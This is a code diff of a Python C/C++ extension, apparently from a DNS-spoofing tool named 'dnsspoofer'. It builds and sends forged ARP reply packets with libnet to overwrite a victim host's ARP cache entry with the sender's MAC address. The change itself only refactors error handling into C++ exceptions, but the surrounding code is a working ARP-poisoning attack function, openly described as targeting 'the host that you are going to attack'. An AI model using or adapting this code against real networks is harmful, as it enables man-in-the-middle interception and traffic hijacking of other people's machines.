@@ -1,60 +1,54 @@
 #include <Python.h>
 #include <libnet.h>
+#include <stdexcept>
+#include <iostream>
 
+
+//realeasing the GIL won't make almost any difference
+//because the functions are IO bound not CPU bound
+//so I'm doing this just for fun
 #define RUN_WITH_ALLOW_THREADS
+
+
+
+class LibnetError: public std::runtime_error
+{
+public:
+    LibnetError(const std::string& what_arg):
+            std::runtime_error(what_arg){};
+    LibnetError( const char* what_arg ):
+            std::runtime_error(what_arg){};
+};
 
 /**
  * @param vulnerable_host_mac_addr: host that you are going to attack
  * @param ip_cache_entry: IP for which you want to override ARP-cache entry with your MAC addr
- * TODO add ability to choose interface - libnet_init second argument
- * @return returns NULL on success and pointer to error_buffer on error.
- * The ownership of the error_buffer is transferred (error_buffer will need to be freed by the function that called spoof_arp).
- * TODO this is overly complicated - maybe return bool true/false and
- * TODO take an additional argument char * error_buffer and only set it if an error occurred
- * TODO on malloc returning NULL set return type to false (error) but set the error_buffer the NULL and let the outer block handle the error
- * TODO without doing here the Py_BLOCK_THREADS magic
+ * @param device: (optional) the network interface that you want to use
  */
-static const char *
-
-#ifdef RUN_WITH_ALLOW_THREADS
-spoof_arp(const u_int8_t* vulnerable_host_mac_addr, char* ip_cache_entry, const char * device, PyThreadState * _save){
-#endif
-
-#ifndef RUN_WITH_ALLOW_THREADS
-spoof_arp(const u_int8_t* vulnerable_host_mac_addr, char* ip_cache_entry, const char * device){
-#endif
-
+static void
+spoof_arp(const uint8_t* vulnerable_host_mac_addr, char* ip_cache_entry, const char * device){
     libnet_t *ln;
     u_int32_t target_ip_addr, zero_ip_addr;
-    u_int8_t zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    const u_int8_t zero_hw_addr[]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     struct libnet_ether_addr* src_hw_addr;
     char libnet_init_errbuf[LIBNET_ERRBUF_SIZE];
-
+    char host_name[] =  "0.0.0.0";
     if((ln = libnet_init(LIBNET_LINK, device, libnet_init_errbuf))==NULL){
-        char * error_buffer = malloc(LIBNET_ERRBUF_SIZE);
-        if(error_buffer==NULL) {
-#ifdef RUN_WITH_ALLOW_THREADS
-             Py_BLOCK_THREADS;
-             _save = NULL;
-#endif
-             return (char *) PyErr_NoMemory();
-        }
-        strncpy(error_buffer, libnet_init_errbuf, LIBNET_ERRBUF_SIZE);
-        return error_buffer;
+        throw LibnetError(libnet_init_errbuf);
     }
     if((src_hw_addr = libnet_get_hwaddr(ln))==NULL)
         goto cleanup_error;
     if((target_ip_addr = libnet_name2addr4(ln, ip_cache_entry, LIBNET_RESOLVE)) == -1)
         goto cleanup_error;
-    if((zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE)) == -1)
+    if((zero_ip_addr = libnet_name2addr4(ln, host_name, LIBNET_DONT_RESOLVE)) == -1)
         goto cleanup_error;
     if(libnet_autobuild_arp(
-            ARPOP_REPLY,                     /* operation type       */
-            src_hw_addr->ether_addr_octet,   /* sender hardware addr */
-            (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
-            zero_hw_addr,                    /* target hardware addr */
-            (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
-            ln)==-1)                         /* libnet context       */
+            ARPOP_REPLY,                       /* operation type       */
+            src_hw_addr->ether_addr_octet,     /* sender hardware addr */
+            (const uint8_t*) &target_ip_addr,  /* sender protocol addr */
+            (const uint8_t*) zero_hw_addr,    /* target hardware addr */
+            (uint8_t*) &zero_ip_addr,          /* target protocol addr */
+            ln)==-1)                           /* libnet context       */
         goto cleanup_error;
     if(libnet_autobuild_ethernet(vulnerable_host_mac_addr, ETHERTYPE_ARP, ln) == -1)
         goto cleanup_error;
@@ -62,23 +56,13 @@ spoof_arp(const u_int8_t* vulnerable_host_mac_addr, char* ip_cache_entry, const 
         goto cleanup_error;
 
     libnet_destroy(ln);
-    return NULL;
+    return;
 
     cleanup_error: ;
-        char * error_buffer = libnet_geterror(ln);
         // libnet_destroy is going to destroy the error_buffer, so we need to copy it
-        ssize_t error_size = strlen(error_buffer)+1;
-        char * error_buffer_copy = malloc(error_size);
-        if(error_buffer_copy == NULL){
-#ifdef RUN_WITH_ALLOW_THREADS
-            Py_BLOCK_THREADS;
-            _save = NULL;
-#endif
-            return (char *) PyErr_NoMemory();
-        }
-        strncpy(error_buffer_copy, error_buffer, strlen(error_buffer)+1);
+        std::string error_buffer=libnet_geterror(ln);
         libnet_destroy(ln);
-        return error_buffer_copy;
+        throw LibnetError(error_buffer);
 }
 
 static PyObject *
@@ -92,7 +76,7 @@ dnsspoofer_spoof_arp(PyObject *self, PyObject *args)
     if (!PyArg_ParseTuple(args, "SS|z#", &target_mac_addr, &ip_to_spoof, &device, &device_len))
         return NULL;
 
-    const u_int8_t * vulnerable_host_mac_addr;
+    const uint8_t * vulnerable_host_mac_addr;
     Py_ssize_t vulnerable_host_mac_addr_size;
     if (PyBytes_AsStringAndSize((PyObject *) target_mac_addr, (char**)&vulnerable_host_mac_addr, &vulnerable_host_mac_addr_size)==-1)
         return NULL;
@@ -106,30 +90,30 @@ dnsspoofer_spoof_arp(PyObject *self, PyObject *args)
         return NULL;
 
 
-    char * error_buffer;
 #ifdef RUN_WITH_ALLOW_THREADS
     Py_BEGIN_ALLOW_THREADS
-    error_buffer=spoof_arp(vulnerable_host_mac_addr, ip_cache_entry, device, _save);
 #endif
-
-#ifndef RUN_WITH_ALLOW_THREADS
-    error_buffer=spoof_arp(vulnerable_host_mac_addr, ip_cache_entry, device);
+    try {
+        spoof_arp(vulnerable_host_mac_addr, ip_cache_entry, device);
+    }
+    catch (const LibnetError& err){
+#ifdef RUN_WITH_ALLOW_THREADS
+        Py_BLOCK_THREADS;
 #endif
+        PyErr_SetString(PyExc_RuntimeError, err.what());
+        return NULL;
+    }
+    catch(std::bad_alloc){
+#ifdef RUN_WITH_ALLOW_THREADS
+        Py_BLOCK_THREADS;
+#endif
+        return PyErr_NoMemory();
+    }
 
 
 #ifdef RUN_WITH_ALLOW_THREADS
-    if(_save == NULL) // PyErr_NoMemory
-        return NULL;
     Py_END_ALLOW_THREADS
 #endif
-
-    if(error_buffer){
-        PyErr_SetString(PyExc_RuntimeError, error_buffer);
-        return NULL;
-    }
-    if(PyErr_Occurred()){ // PyErr_NoMemory
-        return NULL;
-    }
 
 
     Py_RETURN_NONE;
